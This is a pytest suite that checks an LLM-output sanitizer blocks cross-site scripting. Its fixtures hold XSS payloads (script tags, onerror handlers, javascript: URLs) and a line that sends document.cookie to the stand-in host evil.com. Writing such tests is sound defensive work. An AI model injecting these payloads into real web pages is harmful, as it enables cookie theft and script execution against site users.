"""
LLM Sanitization Tests - XSS Prevention

This test suite validates that the LLM sanitization pipeline
effectively prevents Cross-Site Scripting (XSS) attacks from
LLM-generated content.

Compliance: OWASP XSS, HIPAA §164.312(e)(1), SOC 2 CC7.2
"""

import pytest
from app.services.llm_sanitization import LLMSanitizer, ContentType


class TestXSSPrevention:
    """Test XSS attack prevention"""

    @pytest.fixture
    def sanitizer(self):
        """Create sanitizer instance"""
        return LLMSanitizer()

    # ========================================================================
    # Script Tag Tests
    # ========================================================================

    def test_blocks_script_tags_basic(self, sanitizer):
        """Verify basic <script> tags are removed"""
        malicious = "<script>alert('XSS')</script>"
        result = sanitizer.sanitize(malicious, content_type="text")

        assert "<script>" not in result.sanitized
        assert "</script>" not in result.sanitized
        assert "alert(" not in result.sanitized
        # Script tags are detected as JAVASCRIPT content type
        assert result.content_type in [ContentType.JAVASCRIPT, ContentType.HTML]
        assert any("JavaScript" in mod or "script" in mod.lower() or "HTML" in mod for mod in result.modifications)

    def test_blocks_script_tags_with_attributes(self, sanitizer):
        """Verify <script> tags with attributes are removed"""
        malicious = '<script src="https://evil.com/xss.js"></script>'
        result = sanitizer.sanitize(malicious, content_type="text")

        assert "<script>" not in result.sanitized
        assert "evil.com" not in result.sanitized
        assert "src=" not in result.sanitized

    def test_blocks_script_tags_case_variants(self, sanitizer):
        """Verify case variants of <script> tags are removed"""
        malicious = '<Script>alert("XSS")</SCRIPT>'
        result = sanitizer.sanitize(malicious, content_type="text")

        assert "script" not in result.sanitized.lower()
        assert "alert(" not in result.sanitized

    def test_blocks_multiple_script_tags(self, sanitizer):
        """Verify multiple <script> tags are all removed"""
        malicious = """
        <script>alert(1)</script>
        Some content
        <script>alert(2)</script>
        <script src="evil.js"></script>
        """
        result = sanitizer.sanitize(malicious, content_type="text")

        assert "<script>" not in result.sanitized.lower()
        assert result.sanitized.count("alert(") == 0

    # ========================================================================
    # Event Handler Tests
    # ========================================================================

    def test_blocks_onload_event(self, sanitizer):
        """Verify onload event handler is removed"""
        malicious = '<img src="x" onerror="alert(1)">'
        result = sanitizer.sanitize(malicious, content_type="text")

        assert "onerror=" not in result.sanitized
        assert "alert(1)" not in result.sanitized

    def test_blocks_onclick_event(self, sanitizer):
        """Verify onclick event handler is removed"""
        malicious = '<button onclick="malicious()">Click me</button>'
        result = sanitizer.sanitize(malicious, content_type="text")

        assert "onclick=" not in result.sanitized
        assert "malicious()" not in result.sanitized

    def test_blocks_onmouseover_event(self, sanitizer):
        """Verify onmouseover event handler is removed"""
        malicious = '<a href="#" onmouseover="stealCookies()">Hover</a>'
        result = sanitizer.sanitize(malicious, content_type="text")

        assert "onmouseover=" not in result.sanitized
        assert "stealCookies()" not in result.sanitized

    def test_blocks_all_event_handlers(self, sanitizer):
        """Verify all on* event handlers are removed"""
        malicious = """
        <div onload="evil1()" onerror="evil2()" onclick="evil3()"
             onmouseover="evil4()" onfocus="evil5()" onblur="evil6()">
        """
        result = sanitizer.sanitize(malicious, content_type="text")

        # Check that all event handlers were removed
        assert "onload=" not in result.sanitized
        assert "onerror=" not in result.sanitized
        assert "onclick=" not in result.sanitized
        assert "onmouseover=" not in result.sanitized
        assert "onfocus=" not in result.sanitized
        assert "onblur=" not in result.sanitized

    # ========================================================================
    # JavaScript Protocol Tests
    # ========================================================================

    def test_blocks_javascript_protocol(self, sanitizer):
        """Verify javascript: protocol is removed"""
        malicious = '<a href="javascript:alert(1)">Click</a>'
        result = sanitizer.sanitize(malicious, content_type="text")

        assert "javascript:" not in result.sanitized.lower()
        assert "alert(1)" not in result.sanitized

    def test_blocks_javascript_protocol_case_variants(self, sanitizer):
        """Verify case variants of javascript: protocol are removed"""
        malicious = '<a href="JavaScript:alert(1)">Click</a>'
        result = sanitizer.sanitize(malicious, content_type="text")

        assert "javascript:" not in result.sanitized.lower()

    def test_blocks_javascript_in_iframe(self, sanitizer):
        """Verify javascript: in iframe src is removed"""
        malicious = '<iframe src="javascript:alert(1)"></iframe>'
        result = sanitizer.sanitize(malicious, content_type="text")

        assert "javascript:" not in result.sanitized.lower()

    # ========================================================================
    # HTML Entity Encoding Tests
    # ========================================================================

    def test_html_entity_encoding(self, sanitizer):
        """Verify proper HTML entity encoding"""
        content = "<p>Safe content & special chars: < > & \" '</p>"
        result = sanitizer.sanitize(content, content_type="text")

        # After sanitization, should be entity-encoded
        assert "&lt;" in result.sanitized or "<p>" not in result.sanitized
        assert "&gt;" in result.sanitized or ">" not in result.sanitized
        assert "&amp;" in result.sanitized or "&" not in result.sanitized

    def test_preserves_safe_text(self, sanitizer):
        """Verify safe text content is preserved"""
        safe = "This is safe text with no HTML."
        result = sanitizer.sanitize(safe, content_type="text")

        assert "This is safe text" in result.sanitized
        assert len(result.modifications) == 0

    # ========================================================================
    # Complex XSS Payloads
    # ========================================================================

    def test_blocks_xss_with_html_comments(self, sanitizer):
        """Verify XSS hidden in HTML comments is blocked"""
        malicious = "<!-- <script>alert(1)</script> -->"
        result = sanitizer.sanitize(malicious, content_type="text")

        assert "<script>" not in result.sanitized
        assert "alert(" not in result.sanitized

    def test_blocks_obfuscated_script(self, sanitizer):
        """Verify obfuscated script tags are blocked"""
        malicious = "<script/src=//evil.com/xss.js></script>"
        result = sanitizer.sanitize(malicious, content_type="text")

        assert "evil.com" not in result.sanitized
        # Script tag is removed (message may contain "javascript" but that's the removal message, not code)
        assert "<script" not in result.sanitized.lower()
        assert "evil.com" not in result.sanitized

    def test_blocks_dom_based_xss(self, sanitizer):
        """Verify DOM-based XSS patterns are blocked"""
        malicious = '<img src=x onerror="document.location=\'http://evil.com/\'+document.cookie">'
        result = sanitizer.sanitize(malicious, content_type="text")

        assert "onerror=" not in result.sanitized
        assert "document.location" not in result.sanitized
        assert "document.cookie" not in result.sanitized

    # ========================================================================
    # Approval Requirements
    # ========================================================================

    def test_javascript_content_requires_approval(self, sanitizer):
        """Verify JavaScript content requires approval"""
        malicious = "function stealData() { return 'sensitive'; }"
        result = sanitizer.sanitize(malicious, content_type="code")

        # JavaScript functions are detected as JAVASCRIPT or CODE
        assert result.content_type in [ContentType.JAVASCRIPT, ContentType.CODE]
        assert result.approval_required is True
        assert result.approval_request_id is not None

    # ========================================================================
    # Warnings and Modifications
    # ========================================================================

    def test_generates_warning_for_malicious_content(self, sanitizer):
        """Verify warnings are generated for malicious content"""
        malicious = "<script>alert(1)</script>"
        result = sanitizer.sanitize(malicious, content_type="text")

        assert len(result.modifications) > 0 or len(result.warnings) > 0

    def test_tracks_modifications(self, sanitizer):
        """Verify sanitization modifications are tracked"""
        malicious = '<script>alert(1)</script><img src="x" onerror="alert(2)">'
        result = sanitizer.sanitize(malicious, content_type="text")

        # Should track that script tags and event handlers were removed
        assert len(result.modifications) > 0

    # ========================================================================
    # Edge Cases
    # ========================================================================

    def test_empty_string(self, sanitizer):
        """Verify empty string is handled correctly"""
        result = sanitizer.sanitize("", content_type="text")

        assert result.sanitized == ""
        assert result.content_type == ContentType.TEXT

    def test_null_bytes(self, sanitizer):
        """Verify null bytes are handled correctly"""
        malicious = "<script>\x00alert(1)</script>"
        result = sanitizer.sanitize(malicious, content_type="text")

        # Script tag should be removed (message may contain "javascript" but that's ok)
        assert "<script" not in result.sanitized.lower()
        assert "alert(1)" not in result.sanitized

    def test_unicode_xss(self, sanitizer):
        """Verify Unicode-based XSS is blocked"""
        malicious = "<script>\u0061\u006c\u0065\u0072\u0074(1)</script>"  # alert
        result = sanitizer.sanitize(malicious, content_type="text")

        # Script tag should be removed
        assert "<script" not in result.sanitized.lower()
        assert "alert(" not in result.sanitized


class TestXSSPreventionStrictMode:
    """Test XSS prevention with strict mode enabled"""

    @pytest.fixture
    def sanitizer(self):
        """Create sanitizer in strict mode"""
        return LLMSanitizer()

    def test_strict_mode_content_type_mismatch(self, sanitizer):
        """Verify strict mode catches content type mismatches"""
        javascript = "function malicious() { exploit(); }"

        result = sanitizer.sanitize(javascript, content_type="text", strict_mode=True)

        # Should detect it's actually code/javascript, not text
        assert result.content_type == ContentType.JAVASCRIPT or result.content_type == ContentType.CODE
        assert len(result.warnings) > 0
        assert any("mismatch" in w.lower() for w in result.warnings)
